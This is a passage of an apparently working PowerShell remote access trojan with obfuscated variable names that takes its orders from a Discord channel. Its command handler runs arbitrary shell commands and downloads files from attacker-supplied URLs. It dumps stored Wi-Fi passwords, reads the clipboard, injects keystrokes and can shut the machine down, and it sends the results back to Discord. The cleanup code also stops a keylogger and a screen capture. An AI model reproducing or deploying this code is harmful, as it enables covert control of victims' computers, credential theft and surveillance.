                try { $dfaOgfK = [uri]$RG6Zka } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $XfeP = [System.IO.Path]::GetFileName($dfaOgfK.LocalPath); if (-not $XfeP) { $XfeP = "dl_$(Get-Date -Format 'HHmmss')" }
                $iTRaf = Join-Path $script:workDir $XfeP
                try { Invoke-WebRequest -Uri $RG6Zka -OutFile $iTRaf -UseBasicParsing; Send-DiscordMessage -Content "``$iTRaf``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "cmd"    { if (-not $BktMd) { return }; $qUNra = Invoke-CmdCommand -Command $BktMd; Send-CodeBlock -Title "cmd" -Body $qUNra -ReplyToId $msgId; return }
            "ps_cmd" { if (-not $BktMd) { return }; $qUNra = Invoke-PSCommand -Command $BktMd; Send-CodeBlock -Title "ps" -Body $qUNra -ReplyToId $msgId; return }
            "run"    { if (-not $BktMd) { return }; $qUNra = Invoke-CmdCommand -Command $BktMd; Send-CodeBlock -Title "run" -Body $qUNra -ReplyToId $msgId; return }
            "ps"     { $qUNra = Invoke-PSCommand -Command 'Get-Process|Sort-Object CPU -Descending|Select-Object -First 30 Name,Id,CPU,WS|Format-Table -AutoSize'; Send-CodeBlock -Title "proc" -Body $qUNra -ReplyToId $msgId; return }
            "sysinfo"{ $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,LastBootUpTime|Format-List'; Send-CodeBlock -Title "sysinfo" -Body $qUNra -ReplyToId $msgId; return }
            "cpu"    { $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_Processor|Format-List Name,NumberOfCores,NumberOfLogicalProcessors'; Send-CodeBlock -Title "cpu" -Body $qUNra -ReplyToId $msgId; return }
            "ram"    { $qUNra = Invoke-PSCommand -Command '$o=Get-CimInstance Win32_OperatingSystem;"Total: {0:N2} GB / Free: {1:N2} GB" -f ($o.TotalVisibleMemorySize/1MB),($o.FreePhysicalMemory/1MB)'; Send-CodeBlock -Title "ram" -Body $qUNra -ReplyToId $msgId; return }
            "disk"   { $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|ForEach-Object{"{0}: {1:N1} GB free / {2:N1} GB" -f $_.DeviceID,($_.FreeSpace/1GB),($_.Size/1GB)}'; Send-CodeBlock -Title "disk" -Body $qUNra -ReplyToId $msgId; return }
            "ipconfig" { $qUNra = Invoke-CmdCommand -Command "ipconfig /all"; Send-CodeBlock -Title "ipconfig" -Body $qUNra -ReplyToId $msgId; return }
            "netstat"  { $qUNra = Invoke-CmdCommand -Command "netstat -ano"; Send-CodeBlock -Title "netstat" -Body $qUNra -ReplyToId $msgId; return }
            "wifipass" { $qUNra = Get-WifiPasswords; Send-CodeBlock -Title "wifi pass" -Body $qUNra -ReplyToId $msgId; return }
            "admin"  { Send-DiscordMessage -Content "admin: $(if(Test-Admin){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "keys"   { if (-not $BktMd) { return }; $ZOfmyDS = $BktMd -replace "'","''"; Invoke-PSCommand -Command "`$w=New-Object -ComObject WScript.Shell;`$w.SendKeys('$ZOfmyDS')" | Out-Null; Send-DiscordMessage -Content "keys sent" -ReplyToId $msgId; return }
            "clipboard_get" { $qUNra = Invoke-PSCommand -Command "Get-Clipboard"; Send-CodeBlock -Title "clip" -Body $qUNra -ReplyToId $msgId; return }
            "clipboard_set" { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Set-Clipboard '$BktMd'" | Out-Null; Send-DiscordMessage -Content "ok" -ReplyToId $msgId; return }
            "lock"   { Invoke-CmdCommand -Command "rundll32.exe user32.dll,LockWorkStation" | Out-Null; Send-DiscordMessage -Content "locked" -ReplyToId $msgId; return }
            "shutdown_sys" { Invoke-CmdCommand -Command "shutdown /s /t 5" | Out-Null; Send-DiscordMessage -Content "off 5s" -ReplyToId $msgId; return }
            "restart_sys"  { Invoke-CmdCommand -Command "shutdown /r /t 5" | Out-Null; Send-DiscordMessage -Content "restart 5s" -ReplyToId $msgId; return }
            "msg"    { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('$BktMd','Msg')" | Out-Null; Send-DiscordMessage -Content "msg" -ReplyToId $msgId; return }
            "speak"  { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName System.Speech;`$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;`$s.Speak('$BktMd')" | Out-Null; Send-DiscordMessage -Content "speak" -ReplyToId $msgId; return }
            "beep"   { Invoke-PSCommand -Command '[console]::beep(1000,500)' | Out-Null; Send-DiscordMessage -Content "beep" -ReplyToId $msgId; return }

            default {
                if (-not $bdUegpN -and $eITC67) {
                    $AD04G = Download-DiscordAttachment -Message $Message
                    if ($AD04G.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($AD04G | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
                    return
                }
                $CzbEC5C = Test-Dangerous -Command $bdUegpN
                if ($CzbEC5C) { Send-DiscordMessage -Content "REFUSED: $CzbEC5C" -ReplyToId $msgId; return }
                $qUNra = Invoke-CmdCommand -Command $bdUegpN
                Send-CodeBlock -Title "$($script:pcName)> $bdUegpN" -Body $qUNra -ReplyToId $msgId
                return
            }
        }
    } catch {
        Log "[ERR] $($_.Exception.Message)" "Red"
        try { Send-DiscordMessage -Content "err: $($_.Exception.Message)" -ReplyToId $Message.id } catch {}
    }
}

# ==================== MAIN ====================
LogA "============================================" "Cyan"
LogA " DISCORD AGENT v8.7" "Cyan"
LogA "============================================" "Cyan"
LogA " Name:     $($script:pcName)" "White"
LogA " ID:       $($script:machineId)" "White"
LogA " Host:     $($script:hostname)" "White"
LogA " Instance: #$($script:instanceId)" "White"
LogA " PID:      $($script:myPid)" "White"
LogA " Mutex:    $($script:mutexName)" "White"
LogA "============================================" "Cyan"

if (-not $script:mutex) { LogA "Khong tao duoc mutex - thoat." "Red"; exit 1 }

$script:isActive = Try-Acquire
if (-not $script:isActive) {
    LogA ""
    LogA "BACKUP MODE" "Yellow"
    while ($script:running -and -not $script:isActive) {
        Start-Sleep -Seconds $script:backupTick
        if (Try-Acquire) { $script:isActive = $true; LogA "LOCK ACQUIRED" "Green"; break }
    }
    if (-not $script:isActive) { Release-Lock; exit 0 }
}

LogA "ACTIVE MODE" "Green"

try {
    $vrCTZhd = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $bqueD -Method Get
    LogA "Bot: $($vrCTZhd.username)" "Green"
} catch { LogA "API fail: $_" "Red"; Release-Lock; exit 1 }

try {
    $AH9helmm = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" -Headers $bqueD
    if ($AH9helmm) {
        $PAbEkp = if ($AH9helmm -is [array]) { $AH9helmm[0] } else { $AH9helmm }
        if ($PAbEkp -and $PAbEkp.id) { $script:lastMessageId = [string]$PAbEkp.id }
    }
} catch { }

Send-Heartbeat

try {
    while ($script:running) {
        try {
            if (-not $script:isActive) { break }
            $n3f1 = New-Object System.Collections.ArrayList
            $Q5AV4 = $script:lastMessageId
            $QSCf = [string]::IsNullOrEmpty($Q5AV4)
            do {
                if ($QSCf) { $RG6Zka = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" }
                else { $RG6Zka = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=50&after=$Q5AV4" }
                $EMaEZ = Invoke-RestMethod -Uri $RG6Zka -Headers $bqueD -Method Get
                if (-not $EMaEZ) { break }
                if ($EMaEZ -isnot [array]) { $EMaEZ = @($EMaEZ) }
                $EMaEZ = @($EMaEZ | Sort-Object { [long]$_.id })
                foreach ($EFfic in $EMaEZ) { [void]$n3f1.Add($EFfic); $Q5AV4 = $EFfic.id }
                if ($QSCf) { break }
            } while ($EMaEZ.Count -eq 50)

            if ($QSCf) {
                if ($n3f1.Count -gt 0) { $script:lastMessageId = [string]$n3f1[$n3f1.Count - 1].id }
            } else {
                foreach ($EFfic in $n3f1) {
                    if (-not $script:lastMessageId -or [long]$EFfic.id -gt [long]$script:lastMessageId) { $script:lastMessageId = $EFfic.id }
                    if ($EFfic.author.id -eq $script:botUserId) { continue }
                    Handle-Command -Message $EFfic
                }
            }
            if (((Get-Date) - $script:lastBeat).TotalSeconds -ge $script:heartbeatSec) { Send-Heartbeat }
        } catch { Log "[POLL] $($_.Exception.Message)" "Red"; Start-Sleep -Seconds 3 }
        Start-Sleep -Seconds $script:pollInterval
    }
} finally {
    if ($script:capturePid) { try { Stop-CaptureStream | Out-Null } catch { } }
    if ($script:keylogPid) { try { Stop-KeyLog | Out-Null } catch { } }
    Release-Lock
    LogA "Agent ket thuc." "Cyan"
}
